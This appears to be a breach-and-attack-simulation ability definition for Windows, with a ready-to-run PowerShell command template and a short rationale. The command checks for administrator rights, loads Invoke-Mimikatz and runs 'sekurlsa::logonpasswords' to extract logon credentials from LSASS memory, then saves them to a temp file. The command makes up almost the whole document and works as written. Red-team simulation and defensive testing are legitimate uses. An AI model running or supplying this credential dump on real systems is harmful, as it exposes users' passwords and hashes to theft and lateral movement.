ability.name: LSASS Credential Extraction via Invoke-Mimikatz
ability.description: Dot-sources and runs Invoke-Mimikatz to extract credentials from LSASS memory if operating with administrative privileges.

stages.command_template: $d='C:/Windows/Temp/bas'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); if ($isAdmin) { . .\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords exit" } else { Write-Output "ERROR: Non-admin session. Skipping LSASS dump via Mimikatz." } } catch { $_ }) | Tee-Object -FilePath $d/mimikatz.txt

rationale: Correctly references and dot-sources the pre-uploaded Invoke-Mimikatz.ps1 payload without jumping straight to raw execution. It omits comsvcs from the plan to strictly avoid concurrently running LSASS dumping tools in a single execution loop.
